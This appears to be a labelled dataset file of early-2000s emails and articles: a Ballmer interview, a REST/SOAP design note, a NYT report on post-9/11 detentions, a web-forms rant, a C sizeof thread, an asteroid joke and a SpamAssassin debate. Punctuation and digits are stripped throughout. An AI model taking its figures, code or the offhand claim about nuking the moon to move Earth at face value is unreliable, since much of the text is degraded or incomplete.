focusing on customer issues and customer satisfaction and trustworthy computing  which we have articulated  Now there are some things I would have done differently  in       hindsight  I would have increased the focus on not just security but deployment  because a lot of the security problems are actually deployment problems  We have the fix  but sometimes we can t get the tools in their hands to deploy those fixes fast enough  Licensing    I know I would have given more time  and there are better ways to plan around the kinds of changes we made  We are still going to have to get smart about the full ramifications     Do you expect any changes to be made between now and July    to   Licensing      There is a lot of push back on this   No  there is nothing that will happen between now and July     And we will continue to learn over time what we need to do to earn our customers  trust and earn their business  I think many of the people who are pushing back really don t even know the new terms     Isn t that your fault for not educating them   Yes  it is our fault  But you meet with plenty of customers whose companies already have licenses  and they are saying   I think there s a problem   I don t deny there are some problems  I am sure there are some issues we will have to work on over time   After July    we are going to see what the real issues are  I was talking to a customer at the show who was saying he thought there would be a problem  and I told him that we just completed a deal with his company and that he is now universally licensed and that total costs to his company are now lower than they were before  And he said   Oh really    So we ll go through July     We have a lot of customers who have signed licenses  and I am sure we are going to find some issues  My bigger concerns today are probably not in the larger accounts  but there may be some issues we need to address among the smaller size companies  and we will     How does the  Net initiative change the way in house client and server   developers work together    What we are trying to do for the health of  Net and the health of the company and the sanity of the people who work there and the quality of the products we produce is to have a more orchestrated   ber road map of where we are going   Now there are two things a road map can be  One is just a piece of paper that tells what everyone is doing and records a bunch of bottom up plans  Or it can be something where we impose more broadly our vision from the top  We are not going to try to get everything shared      That s a path for getting everything stopped up  But at the same time we are trying to take the top four or five things we are trying to do in the Longhorn wave  Yukon wave  or the  Net wave and really have enough time to have some cross cutting discussions about how we make that happen   Bill [Gates] is dedicated full time to being chief software architect  He also happens to be chairman of the company  but he spends most of his time being chief software architect  We have a body now that meets every month    the SLTT [Senior Leadership Technical Team]  basically the top people involved in the product creating strategy    and we present and discuss the issues  Bill

company  And from Bill s perspective  [this framework] is the technical road map and the SLTT process  it is the scenarios  From my perspective  it is the P L [profit and loss] structure and the multiple businesses because  given how we work  giving people a framework that gets them to make the whole bigger than the sum of the parts will mean we have better offerings     It seems the scenarios construct is really working for you  Is this an   evolution of the solutions approach    I would say it is a pretty direct extrapolation from the solutions stuff  only I think we are just getting a little more experience  I think we use the word scenarios more often and solutions less  because solution sounds more like a fixed thing  At the end of the day  most of the things we do are customizable and programmable  and so people make them into the solution they want  But they are still scenarios  What will software deployment look like  Well  that is a scenario because it involves Windows  Office  and other applications   We are working hard to make sure the whole is bigger than the sum of the parts  That s not to say people are always comfortable with this  I can t even say we will do it perfectly  All we have to do is do it a lot better than we had been doing it  I think that would be a big step forward for the customers     Will this approach cut down on some of the technology civil wars   Microsoft has had in the past involving who is going to gain control of   a project  This seems to be a very democratic approach to development   I would not use the word democracy to describe it  People have to come together and ultimately make some decisions  This is not a voting process here  the agenda of what we think is important  We get a lot of input  [But] once it is decided  people don t get to vote with their feet   We try to make a quantum leap here in terms of our ability to improve pulling together all the pieces  Our customers want us to do that  Simplifying concepts by unifying them  The customers don t say they want us to do that  but when we do do that  they go   Ahhh  I get it  That makes sense    I don t want to go to six more meetings where people say   Is your workflow strategy BizTalk       Or  What s your Office workflow strategy   Or  Why is synchronization in some ways better for e mail and Outlook than it is for file folders and Web pages    To get that sort of synchronization sometimes    to get that high level road map to work    you have to build something we don t have today  So we have been talking about unifying storage  And so the best way to get all this stuff to work is to get them all to work just one way  Then you just keep tuning one set of parameters instead of having a thousand flowers blooming     In your Fusion keynote today  you talked about who your competitors   are  and it was the usual suspects  But one you didn t mention is   yourself  You are competing against the last generation of your technology   Always  Given that our stuff doesn t wear out or break down    you can question whether it breaks or not [Ballmer grins]    but it doesn t break down like machinery does  To get anyone to do something new  we have to have something interesting and innovative   People think  OK  should we just do more upgrades or try to sell more new product  We decided that users like us to do a level of systems integration so they don t have to get involved in that  So take Sharepoint Team Services  which we put in Office  We could have sold Team Services as a separate product  and we could have introduced a new SKU [stock keeping unit]  We could have decided if it should work down level with the old Office or just the new version of Office  and we could do that with real time communications  But we tend to like to put things together  integrate them  and then release batches         which are then  upgrades     as a form of introducing our new innovation  But no matter how you do it  because our stuff does not wear out  we have to convince people that some idea we have is better or more powerful than the older idea we had   And there are two aspects of doing that  One aspect is  on a given product or upgrade release  does that make sense  Or do we convince you that over an nyear period of time we will have enough innovation that you will want to be licensed for that innovation  And this is part of this whole licensing discussion we are having   We moved to the new licensing for two reasons  I would say  No     we wanted to simplify our licensing  When we look back a year from now  I guarantee you that where we are now is simpler than where we were  Nothing is simpler during a transition because they are learning the new and are more familiar with the old  but I think people will eventually realize this is simpler  Our licensing got pretty complicated over the years  and some people came to not understand it all   The other issue is [the timing of delivering] our innovation  I don t want to have a lot of rough questions [from customers]  So when we do have new ideas  it s like  OK  should we put it in this upgrade or that one or just have a stream of stuff that only our best customers have access to under the terms of their contract  I think in the long run we have a better chance of satisfying them with the latter than with hitting them with six different upgrades  I am a fan of [letting] the customer decide  OK  I want that piece or this piece  But they are licensed for all of it  So those are the two things we sought to do     That gets back to the trust issue  where if you front load it  that s   the big  lumpy upgrade  and if you back load it with the vision  the    Net      servers  you have a long gap in the middle where you have to   sell into an untrusting audience   The truth is  we need to be better at both  There are some things you can only do big and lumpy  like a new file system  It s not like some sort of small user feature  if you change the file system  then the storage  the backup  probaby those things are going to change  Probably the shell ought to change The applications     a lot of things are going to change  Can you call that lumpy  Or you can put out four new features in PowerPoint  sure    that would not look lumpy to users   I think we have to build trust in the model  and we are going to have to deliver more over time  It will not come overnight  People will have to see that we do a few things      that not all of our innovation is lumpy  that more of it comes evenly and steadily  People develop a confidence and faith  they like both aspects of the model  Over time  our support needs to become more intimately involved in that story   We know that  but we don t know exactly what that means yet  And this whole notion of software as a service    this is not a licensing or business discussion  It s how does software get rearchitected in the world of the Internet  I mean  how many software products are fundamentally different because of the Internet  Not many  Probably the anti virus guys keep up the best  They are always feeding new virus support in  I asked the audience [at Fusion] how many use Windows Update  Now that s a small piece of software  but it is big  That s the consumer market  we ve got to get that to really purr in the corporate market     The lack of broadband build out and adoption seems to be holding up   the ability for users to take advantage of some new services you re   talking about  When Bill [Gates] invested in Comcast cable  it   triggered the Baby Bells to get on board with DSL  What are you doing   now to deal with that issue   The No    thing is  we have to make software that is so compelling that people will start saying   Well  of course I am going to get broadband      And        is one of those compelling features   Yes  it is  I was in a hotel in Sun Valley  [Utah]  this week that was not wired  So I turned on my PC  and XP tells me there is a wireless network available  So I connect to something called Mountaineer  Well  I don t know what that is  But I have a VPN into Microsoft  it worked  I don t know whose broadband I used  I didn t see it in Bill s room  I called him up and said   Hey  come over to my room   So soon everyone is there and connecting to the Internet through my room   We have to support all the modalities  whether it is GPRS [General Packet Radio Service] or         We have to make it easy to provision from a software perspective for things that go on with DSL [and] cable modems      And the software has to want a broadband link  There are not many things you do where you say I really care about the performance  If I am downloading PowerPoint files  then I want broadband  So when you can do things with speed that you otherwise can t do without speed  that is going to put a lot of pressure on the broadband community   That s the weird answer  The more normal answer is  yeah  isn t it awful  There is not enough broadband  and the prices they charge       I agree with all that  If you look at what happened in Japan recently  there was a big drop    it is now     a month for DSL  Vroom  They have gone from almost no DSL connections a year ago to     [million] or     million [subscribers]     So how do we make that happen in this country   I think that is beyond us  If there is enough interest where the consumers are looking intensely for broadband  whether it is at today s prices or tomorrow s prices  that is going to shake out the marketplace  And I think the marketplace will do a good job  We just have to make it something obvious that consumers want  Now I happen to live in a neigborhood where there is no broadband network  No DSL or cable modems  Well  I have a neighbor  [Teledesic chairman and co CEO] Craig McCaw  who has a wireless network that I think I can piggyback off of [Ballmer laughs]  So  yes  broadband is a bottleneck    but I also think we have to look at oursleves as a software industry and say   Aren t we  too  some of that bottleneck   We have not built software that makes broadband a must have     Microsoft CEO weighs in      Ballmer addresses a number of key issues for customers and partners       On security and trust   There are some things I would have done   differently        On coordinating product groups   We are working hard to make sure   the whole is bigger than the sum of the parts         On product licensing   We are still going to have to get smart   about the full ramifications           aDaM XeNT CoM    long  sig alert     I believe it is quite possible to productively apply both supposedly incompatible approaches [REST   SOAP] together   I ll sketch it out below  both in prescriptive form   Note  while this is proscriptive  it is expected that local adaptations will be provided      Start by modeling the persistent resources that you wish to expose  By persistent resources  I am referring to entities that have a typical life expectancy of days or greater   Ensure that each instance has a unique URL   When possible  assign meaningful names to resources      Whenever possible  provide a default XML representation for each representation   Unlike traditional object oriented programming languages where there is a unique getter per property  typically there will be a single representation of the entire instance   These representations will often contain XLinks  a k a  pointers or references  to other instances      Now add high level methods which take care of all composite create  update  and delete operations   A key aspect of the design is that messages for these operations need to be self contained   both the sender and receiver should be able to make the absolute minimum of assumptions as to the other s state  and multiple requests should not be required to implement a single logical operation   All requests should provide the appearance of being executed atomically      Query operations deserve special consideration   A general purpose XML syntax should be provided in every case   In addition  when a reasonable expectation exists that query parameters will be of a relatively short size and not require significant encoding  then a HTTP GET with the parameters encoded as a query string should also be provided   Implications    The following table emphasizes how this unified approach differs from the  pure   albeit hypothetical  different positions described above      Resource    POST operations explicitly have the possibility of modifying multiple resources   PUT and DELETE operations are rarely used  if ever   GETs may contain query arguments      Get    GETs must never be used for operations which observably change the state of the recipient   POST should be used instead      Message    Do not presume that URLs are static  instead presume that they identify the resource   In particular  recognize that URLs can be dynamically generated   Expect URLs of other SOAP Resources in responses   Use the SOAP Response MEP for pure retrieval operations      Procedure    Treat the URL itself as the implicit first parameter  Allow URLs to be dynamically generated  and returned in structures   Use HTTP GET for retrieval operations   Conclusions    Looking to the future  the application level inter networking protocols that emerge today will likely be the application level intra networking protocols of the next decade   Both REST and SOAP contain features that the others lack   Most significantly   REST

NYTimes com Article  After Sept      a Legal Battle Over Limits of Civil LibertyThis article from NYTimes com  has been sent to you by luke applix com    The mind boggles at the idea that the Bush administration has not bothered to find a serious rationale at all  much less one extraordinary enough to justify these extraordinary measures  much less present it to the public  and that the Bush administration appears to be against American style justice   The default explanation for government secrecy is to conceal official wrongdoing   The administration is here making the case that Americans don t even have a right to question government secrecy   We may find that the history of this past year has been an epic looting from the public  made possible by the urgency of reacting to         luke applix com   After Sept      a Legal Battle Over Limits of Civil Liberty  August         By THE NEW YORK TIMES         This article was reported and written by Adam Liptak  Neil A  Lewis and Benjamin Weiser    In the fearful aftermath of Sept      Attorney General John Ashcroft vowed to use the full might of the federal government and  every available statute  to hunt down and punish  the terrorists among us     The roundup that followed the attacks  conducted with wartime urgency and uncommon secrecy  led to the detentions of more than       people suspected of violating immigration laws  being material witnesses to terrorism or fighting for the enemy    The government s effort has produced few if any law enforcement coups  Most of the detainees have since been released or deported  with fewer than     still being held    But it has provoked a sprawling legal battle  now being waged in federal courthouses around the country  that experts say has begun to redefine the delicate balance between individual liberties and national security    The main combatants are the attorney general and federal prosecutors on one side and a network of public defenders  immigration and criminal defense lawyers  civil libertarians and some constitutional scholars on the other  with federal judges in between    The government s record has so far been decidedly mixed  As it has pushed civil liberties protections to their limits  the courts  particularly at the trial level  have pushed back  stopping well short of endorsing Mr  Ashcroft s tactics or the rationales he has offered to justify them  Federal judges have  however  allowed the government to hold two American citizens without charges in military brigs  indefinitely  incommunicado and without a road map for how they might even challenge their detentions    In the nation s history  the greatest battles over the reach of government power have occurred against the backdrop of wartime  Some scholars say the current restrictions on civil liberties are relatively minor by historical standards and in light of the risks the nation faces    The current struggle centers on three sets of issues  People held simply for immigration violations have objected to new rules requiring that their cases be heard in secret  and they have leveraged those challenges into an attack on what they call unconstitutional preventive detentions    People brought in and jailed as material witnesses  those thought to have information about terrorist plots  have argued that they should not be held to give testimony in grand jury investigations    Finally  Yasser Esam Hamdi and Jose Padilla  the two Americans labeled  enemy combatants  for what the government contends is more direct involvement with terrorist groups  are seeking rights once thought to be fundamental to American citizens  like a lawyer s representation and a chance to challenge their detentions before a civilian judge    So far  federal judges in Newark and Detroit have ordered secret deportation proceedings opened to public scrutiny  and on Friday a federal district judge in Washington ordered that the identities of most of the detainees be made public under the Freedom of Information Act     Secret arrests   Judge Gladys Kessler wrote in the decision on Friday   are a concept odious to a democratic society     A senior Justice Department official said the detentions had been lawful and effective  He said it was hard to  prove a negative  and cite specific terrorist acts that had been disrupted  But he said that department officials believed that the detentions had  incapacitated and disrupted some ongoing terrorist plans     Two federal judges in New York have differed sharply on whether the government may jail material witnesses while they wait to testify in grand jury investigations  In Virginia  a federal judge ordered the government to allow Mr  Hamdi to consult a lawyer     I look at the federal district court judges and just cheer them on  because they are doing exactly what an independent judiciary should be doing   said Jane E  Kirtley  a professor at the University of Minnesota and former executive director for the Reporters Committee for Freedom of the Press   It s not hostile or adversarial  it s simply skeptical     These lower court decisions have for the most part not yet been tested on appeal  and there is reason to think that appeals courts and the Supreme Court will prove more sympathetic to the government s tactics and arguments    The federal appeals court in Richmond  Va   for instance  reversed the decision to allow Mr  Hamdi to talk to a lawyer and ordered the lower court judge to consider additional evidence and arguments    But even the appeals court seemed torn  and it rejected the government s sweeping argument that the courts have no role in reviewing the government s designation of an American citizen as an enemy combatant    The detention issues also carry an emotional punch  Many of the Arabs and Muslims caught in the government dragnet were cabdrivers  construction workers or other types of laborers  and some spent up to seven months in jail before being cleared of terrorism ties and deported or released    Last month  at a conference held by a federal appeals court  Warren Christopher  the secretary of state in the Clinton administration  snapped at Viet Dinh  an assistant attorney general under President Bush  saying that the administration s refusal to identify the people it had detained reminded him of the  disappeareds  in Argentina     I ll never forget going to Argentina and seeing the mothers marching in the streets asking for the names of those being held by the government   Mr  Christopher said   We must be very careful in this country about taking people into custody without revealing their names     Mr  Dinh  who came to the United States as a refugee from Vietnam  recalled his family s anguish when his father was taken away in      for  re education   In contrast  he said  those detained by the United States were not being secretly held but were allowed to go to the press and seek lawyers     These are not incognito detentions   he said   The only thing we will not do is provide a road map for the investigations     According to the Justice Department      of the more than       people detained since Sept     were held on immigration charges  Officials said recently that    remained in detention  Court papers indicate there were about two dozen material witnesses  while most of the other detainees were held on various state and federal criminal charges    President Bush also has announced plans to try suspected foreign terrorists before military tribunals  though no such charges have been brought yet    Last month  William G  Young  the federal judge presiding in Boston over the criminal case against Richard C  Reid  a British citizen accused of trying to detonate a bomb in his shoe on a trans Atlantic flight  noted that the very establishment of those tribunals  has the effect of diminishing the American jury  once the central feature of American justice     Judge Young  who was appointed by President Ronald Reagan  added   This is the most profound shift in our legal institutions in my lifetime and   most remarkable of all   it has taken place without engaging any broad public interest whatsoever     Jack Goldsmith and Cass R  Sunstein  professors at the University of Chicago Law School  have written that the Bush administration s policies are a minimal challenge to civil liberties especially compared with changes during the times of Abraham Lincoln and Franklin D  Roosevelt  What has changed  they say  is a greater sensitivity to civil liberties and a vast increase in mistrust of government    The Secrecy   U S  Says Hearings  Are Not Trials   Ten days after last September s attacks  Michael J  Creppy  the nation s chief immigration judge  quietly issued sweeping instructions to hundreds of judges for what would turn out to be more than      special interest  immigration cases     Each of these cases is to be heard separately from all other cases on the docket   Judge Creppy wrote   The courtroom must be closed for these cases   no visitors  no family  and no press      This restriction   he continued   includes confirming or denying whether such a case is on the docket     The government has never formally explained how it decided which visa violators would be singled out for this extraordinary process  and it has insisted that the designations could not be reviewed by the courts    But as it turns out  most of these cases involved Arab and Muslim men who were detained in fairly haphazard ways  for example at traffic stops or through tips from suspicious neighbors  Law enforcement officials have acknowledged that only a few of these detainees had any significant information about possible terrorists    As the ruling on Friday in Washington suggests  a series of legal challenges to this secrecy has resulted in striking legal setbacks for the administration  Several courts have ordered the proceedings opened and have voiced considerable skepticism about the government s justifications for its detention policies generally    Lee Gelernt  a lawyer at the American Civil Liberties Union  said the secrecy of the proceedings exacerbated the hardships faced by people who disappeared from sight on violations that in the past would not have resulted in incarceration     Preventive detention   he said   is such a radical departure from constitutional traditions that we certainly shouldn t be undertaking it solely on the Justice Department s say so     Malek Zeidan s detention would have been unexceptional had it not given rise to one of the legal challenges that threatens to end the secret proceedings    Mr  Zeidan      is a Syrian citizen who overstayed his visa    years ago and has lived in Paterson  N J   for more than a decade  Over the years  he has delivered pizzas  driven an ice cream truck and pumped gas  When the Immigration and Naturalization Service came around last Jan     to ask him about a former roommate suspected of marriage fraud  Mr  Zeidan was working at Dunkin  Donuts  and his expired visa soon cost him    days in custody    When a hearing was finally held three weeks after his detention  the judge closed the courtroom  excluding Mr  Zeidan s cousin and reporters    The closing of proceedings prompted lawsuits in federal court  from both Mr  Zeidan and two New Jersey newspapers  In March  the government dropped the  special interest  designation  Mr  Zeiden was released after posting a bond  and the case he filed was dismissed  The immigration charges against him will be considered in the fall     You re one of the lucky ones   his lawyer  Regis Fernandez  recalls telling Mr  Zeidan  given that other visa violators were held as long as six or seven months before being deported or released    Mr  Zeidan s lawyers believe that their legal strategy  which focused on openness  forced the government s hand     The government was somehow linking secrecy to guilt   Mr  Fernandez said   We figured if the public had access to these hearings they would see that nothing went on except multiple adjournments and delay     Through a spokeswoman  Judge Creppy declined to comment  An I N S  official  who spoke on the condition that he not be named  said the agency had acted properly in Mr  Zeidan s case and in similar cases    He said the immigration service had always detained people without bond who were linked to criminal investigations  He added that the agency had no choice now but to detain a visa violator until the Federal Bureau of Investigation was sure the person was not involved in terrorism     Consider the flip side   that you held him for two days and then deported him  and    days later you found out he was a terrorist   the official said    The newspapers  lawsuit has continued  It has already once reached the Supreme Court  and the government s papers contain one of the fullest accounts of its position on secrecy and executive power    Its main argument is that the courts have no role because immigration hearings are not really trials  but are merely administrative hearings that can be closed at will    Bennet Zurofsky  who also represented Mr  Zeidan  said he was flabbergasted by this suggestion     A trial is a trial   he said   A person s liberty is at stake  A person is being held in jail  A person is being told where to live     But in a sworn statement submitted in several court cases  Dale L  Watson  the executive assistant director for counterterrorism and counterintelligence at the F B I   outlined the reasoning behind the government demand for total secrecy     Bits and pieces of information that may appear innocuous in isolation can be fit into a bigger picture by terrorist groups   he said    This rationale for withholding information  sometimes called the mosaic theory  is controversial     It s impossible to refute   Professor Kirtley said   because who can say with certainty that it s not true     In May  John W  Bissell  the chief judge of the federal district court in Newark  appointed by President Reagan  ruled for the newspapers and ordered all deportation hearings nationwide to be opened  unless the government is able to show a need for a closed hearing on a case by case basis  His ruling followed a similar one in Detroit the month before  though that case involved only a single detainee    The government appealed to the Court of Appeals for the Third Circuit  in Philadelphia  and asked it to block Judge Bissell s order until the appeal was decided  The court  which will hear arguments in September  declined to do that  A number of news organizations  including The New York Times  filed a brief as a friend of the court in support of the newspapers    The government then asked the United States Supreme Court to stay Judge Bissell s order  The court  in a relatively unusual move given that the case was not before it for any other purpose  blocked Judge Bissell s order  suggesting that it might have more sympathy for the government s arguments    The Witnesses   Rights Violated   Lawyers Contend   Late on Sept      federal agents pulled two nervous Indian men  Mohammed Jaweed Azmath and Syed Gul Mohammed Shah  off an Amtrak train near Fort Worth  They were carrying box cutters  black hair dye and about        in cash and had also shaved their body hair    The agents  suspicions were obvious  The hijackers had used box cutters and knives to take control of the aircraft and had received letters instructing them to  shave excess hair from the body   An F B I  affidavit dated Sept     said there was probable cause to believe that both of the Indian men were involved in  or  were associated  with  those responsible for the Sept     attacks    But even though government officials told reporters that the men had been detained as material witnesses  their lawyers now say that they were held last fall only on immigration violations    The distinction is important because a material witness warrant brings the automatic appointment of a government paid lawyer  while the government does not have to supply a visa violator with counsel    As a result  the authorities were able to question each of the men repeatedly about terrorism without a lawyer present  their current lawyers say    Like some of the people who were picked up as material witnesses  the Indian men were held in isolation in jails in New York for extended periods  It was    days before Mr  Azmath received a lawyer and    days before Mr  Shah did  their lawyers say     It s wrong to keep a man in jail for    days and never bring him before a magistrate to advise him of his rights   Mr  Shah s lawyer  Lawrence K  Feitell  said in an interview   It s wrong not to provide him with an attorney at the threshold  It s wrong to depict this as an I N S  investigation  when in truth and in fact  it s the main inquiry into the World Trade Center debacle     Anthony L  Ricco  the lawyer for Mr  Azmath  said his client was interrogated  often times for several hours a day  with multiple interviewers  getting rapid fire questions from three or four different people     Eventually  the F B I  and the prosecutors cleared the men of any involvement in terrorism  and both pleaded guilty in June in a credit card fraud scheme and are awaiting sentencing    Federal prosecutors said in court papers that both men consented to questioning  Each  was read and waived his Miranda rights before each interview   prosecutors wrote  adding that each man confessed to the credit card offenses    The United States attorney in Manhattan  James B  Comey  would not comment on the specific cases  but said generally of the government s tactics   I don t see any violation of any rule  regulation  or law     I can understand defense lawyers not being happy   he said   But I know our position after      was to use every available tool  to stay within the rules but play the whole field and recognize the boundaries  but cover the whole field     We need to do whatever we can that s legal to investigate and disrupt   he added    Today  it is believed that only a handful of the two dozen material witnesses  perhaps as few as two  are still being detained    But the process of detaining the witnesses has stirred intense criticism    Last April  Judge Shira A  Scheindlin of Federal District Court in Manhattan ruled that the use of the law  to detain people who are presumed innocent under our Constitution in order to prevent potential crimes is an illegitimate use of the statute     Judge Scheindlin said the material witness law applied when witnesses were held to give testimony at trials  not for grand jury investigations   Since        Judge Scheindlin said   no Congress has granted the government the authority to imprison an innocent person in order to guarantee that he will testify before a grand jury conducting a criminal investigation     Then last month  Chief Judge Michael B  Mukasey  also of Federal District Court in Manhattan  upheld the government s use of the material witness statute in grand jury investigations  criticizing Judge Scheindlin s reasoning    Judge Mukasey  citing the assertion in      by Chief Justice John Marshall that  the public has a right to every man s evidence   held that detentions of material witnesses during investigations are proper    The War Captives   No Lawyers Allowed  Under U S  Label   Yasser Esam Hamdi  a Saudi national who was captured in Afghanistan  is probably an American citizen by virtue of having been born in Louisiana  His case represents the core issue of what kind of role the nation s courts should have  if any  in reviewing the government s imprisonment of someone charged with something akin to a war crime    Prosecutors will be back in Federal District Court in Norfolk  Va   next Thursday to confront one of the federal judges who has shown resistance to the government s approach that once someone is declared an  enemy combatant  by the president  all judicial review ceases    Judge Robert G  Doumar  an appointee of President Reagan  has twice ruled that Mr  Hamdi is entitled to a lawyer and ordered the government to allow Frank Dunham  the federal public defender  to be allowed to visit him without government officials or listening devices  Judge Doumar said that  fair play and fundamental justice  require it  He said the government  could not cite one case where a prisoner of any variety within the jurisdiction of a United States District Court  who was held incommunicado and indefinitely     But the three judge panel of the appeals court stayed Judge Doumar s order  saying he had not fully considered the government s needs to keep Mr  Hamdi incommunicado and  more important  the executive branch s primacy in areas of foreign and military affairs     The authority to capture those who take up arms against America belongs to the commander in chief   Chief Judge J  Harvie Wilkinson  rd wrote for the appeals panel    But even Judge Wilkinson seemed to evince some surprise at the breadth of what the government was asserting when he asked the Justice Department s lawyer   You are saying that the judiciary has no right to inquire at all into someone s stature as an enemy combatant     The government has relented slightly  agreeing to provide the court with a sealed declaration of the criteria by which they have judged Mr  Hamdi to be an enemy combatant  But the government has argued that judges cannot argue with the standards    Judge Doumar has indicated that he will question the government closely on those standards    The case of Jose Padilla  which has not progressed as far as that of Mr  Hamdi  may present an even greater challenge to normal judicial procedures    Mr  Padilla  also known as Abdullah al Muhajir  is  like Mr  Hamdi  an American citizen  imprisoned in a naval brig after having been declared an enemy combatant  But unlike Mr  Hamdi  Mr  Padilla was not arrested on the battlefield by the military but on United States soil by civil law enforcement authorities  on May   in Chicago    After his detention as a material witness based on suspicions that he was seeking to obtain material and information to build a radioactive bomb  he was transferred to military custody     This is the model we all fear or should fear   said Mr  Dunham  the public defender   The executive branch can arrest an American citizen here and then declare him an enemy combatant and put him outside the reach of the courts  They can keep him indefinitely without charging him or giving him access to a lawyer or presenting any evidence    http

EBusiness Webforms  cluetrain has left the stationWhat s wrong with doing business over the Web   Web forms   There s promising replacements forms  but this is the current state of the industry    o You find something that you want to fill out   It s a partnership form     a signup for a Web seminar  a request for more information  anything   o You start wasting time typing in all those stupid fields and spend    about    minutes going through all their stupid qualification hoops    just to get a small piece of information   whitepaper  or a callback    when halfway through  you start to wonder if it s really worth your    time to forever be stuck on their stupid prospect list    o Pull down tags are never put in order of use instead of alphabetized     I was on a site just now that had every single country in the world    listed  the selection of your country was absolutely critical for you    to hit submit  but due to the layout  the  more   tag on the second    row was offscreen so it was impossible to select any country except    about two dozen third world countries    o Even worse  ever time you hit submit  all forms based things complain    about using the universal country phone number format and will cause    you to re enter dashes instead of dots   o When you get something that s not entered right  you will go back and    enter it right  but then some other field or most likely pulldown will    automatically get reset to the default value so that you will have to    go back and resent that freaking thing too   Finally after all combinations    of all pulldowns  you may get a successful submit   o You wait freaking forever just to get a confirmation     o Sometimes  like today  you won t be able to ever submit anything due    to it being impossible to ever submit a valid set of information that    is internally non conflicting according to whatever fhead wrote their    forms submission   What s wrong with this picture   The company is screwing you by wasting your time enforcing their data collection standards on you   I m sure there s someone in that company that would be willing to accept  US    U S    USA   United States    U of A    America   etc  and would know exactly which freaking country the interested party was from instead of forcing them to waste even more time playing Web form geography     I m starting to see the light of Passport   You want more information   Hit this passport button   Voila   IE  and Netscape     have pre forms sutff  but I always turn it off because you never know when there s that one field that you don t want to submit to the person you are submitting to that  automatically gets sent  i e  the privacy stuff is well beyond the  average user who will get screwed on privacy stuff     So  if crappy forms based submission is the state of practice for business enablement on the Web  I can t see this whole data submission and hurry up and wait for us to get back to you business process as working all that well    Greg   ,1

Re  Are bad developer libraries the problem with M  software No  you need to learn how declarations work in C   You have specified testbuff as  an array of      pointers to characters    That means  you have allocated an array big enough to store      pointers   On most machines  that s   bytes per pointer  which indeed would give you        John  On Fri  Nov          at         PM        Ali Saifullah Khan wrote    Here is a test done on the return of sizes by sizeof   using pointers        include       int main void       char  testbuff[    ]        int len   sizeof testbuff      cout   return             c  debug\testbuff             The output from this is      but infact it should be returning         Apparently  using a pointer has multiplied the value of the original size of   the testbuff[] buffer by the size of the   pointer          char pointers have a size of   bytes     as is shown when output is   bytes   using   int len   sizeof  char  testbuff          c  debug\testbuff          so sizeof is returning the size of the  first  entity passed to it  that   being the size of the pointer             Whats confusing is when sizeof outputs the value for something like   char     testbuff[]     Here the macro seems to be multiplying the sizes of entities passed to it    by considering the first entity as the pointer denoted by the asterisk   itself        and then taking this value of   and multiplying it with the   size of the buffer testbuff[] which is       to produce an output of            Rather strange behaviour              Original Message         From     To     Cc     Sent  Tuesday  November               AM   Subject  Re  Are bad developer libraries the problem with M  software                  Original Message           From  John Viega     Sent                     PM     To  cdavison nucleus com     Cc  secprog securityfocus com     Subject  Re  Are bad developer libraries the problem with M  software            strlen does not work  because he was trying to get at the ALLOCATED       size of a buffer  not the actual size of the buffer          You re right  I was looking at the safe_strncpy code  and it looks like   the author did use strlen            sizeof will return the size of the data type passed to it   So if you       declared mystr as char mystr[    ]   it will return as the original       author wanted          It will not work with a char   so if your strings are dynamically   allocated  or passed to you as a pointer  these macros will not work                    ,1
Re  Asteroids anyone  With enough warning  you might not even care about trying to divert  the meteor    you d divert the Earth instead   I recall reading many years ago about calculations  done separately both by US and USSR scientists for different reasons  about the effect of nuclear explosions on the moon s mass  and thus its orbit  and thus also  over time  the Earth s path around the sun   I believe the conclusion was that mild changes in the moon s  composition would have the effect  over several years  of changing  significantly where the Earth would be at any certain future point    Voila  No collision    at least not with the initial threat  And no need to travel out to anywhere near the meteor  either  Just the moon     Gordon     http   xent com mailman listinfo fork   ,1

RE  [SAtalk] O T  Habeus    Why Guys  the Habeas Infringers List  HIL  exists explicitly to deal with spammers while we re getting judgments against them and especially in other countries  where those judgments are harder to get   Please note that nobody has ever had an incentive before to go after regular spammers   Yes  some attorneys general have prosecuted blatant pyramid schemes  and ISPs have won some theft of service suits  but the vast majority of spammers go forward with out any legal hassles   So  I can t understand how Daniel can assert that you can t track spammers down when it s never really been tried   We can subpoena the records of the business they spammed on behalf of   We can subpoena the records of the ISP that provided them service  and of the credit card they used for the whack a mole accounts   We can use private investigators   Yes  these people are often lowlifes  chickenboners    But  they re not secret agents   They re just trying to make a buck  and Habeas  whole business is about finding them and putting them out of business  Habeas has the incentive to pursue spammers  that use our warrant mark  in a way that no one ever has had before   Given that our whole business plan relies on Habeas becoming synonymous with  not spam   I can t understand why you would assume ahead of time that we will be unsuccessful  plan for that failure  and in so doing  remove the potential of success  which is anti spam filters like SA acting on the Habeas warrant mark   Daniel  it s easy enough for you to change the Habeas scores yourself on your installation   If Habeas fails to live up to its promise to only license the warrant mark to non spammers and to place all violators on the HIL  then I have no doubt that Justin and Craig will quickly remove us from the next release   But  you re trying to kill Habeas before it has a chance to show any promise   At the end of the day  SpamAssassin is like the Club  in that it encourages thieves  spammers  to just go after the next car  those without SA  rather than yours   Habeas can play the role of LoJack  the transmitter   in enabling the apprehension of thieves so that they don t steal any more cars   But only if we re given a chance to succeed               dan    Dan Kohn            Original Message      From  Daniel Quinlan [mailto quinlan pathname com]  Sent  Wednesday  August                To  Matthew Cline Cc  spamassassin talk example sourceforge net Subject  Re  [SAtalk] O T  Habeus    Why    Matthew Cline  writes     There must be  some  way of tracking a spammer down  since they are   planning on making money from the spam   What a court would consider   evidence of being the spammer is another question   Haha     Just a few notes      It will be difficult to find  prosecute  and win money from someone    in various non friendly countries where spam originates  China is a    good example  even if they do officially  respect  copyright law      Law suits take time  Between now and conclusion of the first court    case  we could have years of spam in our mail boxes      Contact information can change  phone numbers  PO boxes  stolen    cell phones  temporary email addresses  etc      Spammers do not always remember to include contact information   I    don t understand it either  but nobody said they were bright   Also     some spam is non commercial or sent by a third party  for example      pump and dump  stock scams   so contact information is not strictly    required for the spammer to get their way   Dan                                                           This sf net email is sponsored by  Jabber   The world s fastest growing  real time communications platform  Don t just IM  Build it in   http   www jabber com osdn xim _______________________________________________ Spamassassin talk mailing list Spamassassin talk lists sourceforge net https   lists sourceforge net lists listinfo spamassassin talk                                                            This sf net email is sponsored by  Jabber   The world s fastest growing  real time communications platform  Don t just IM  Build it in   http   www jabber com osdn xim _______________________________________________ Spamassassin talk mailing list Spamassassin talk lists sourceforge net https   lists sourceforge net lists listinfo spamassassin talk  ,1

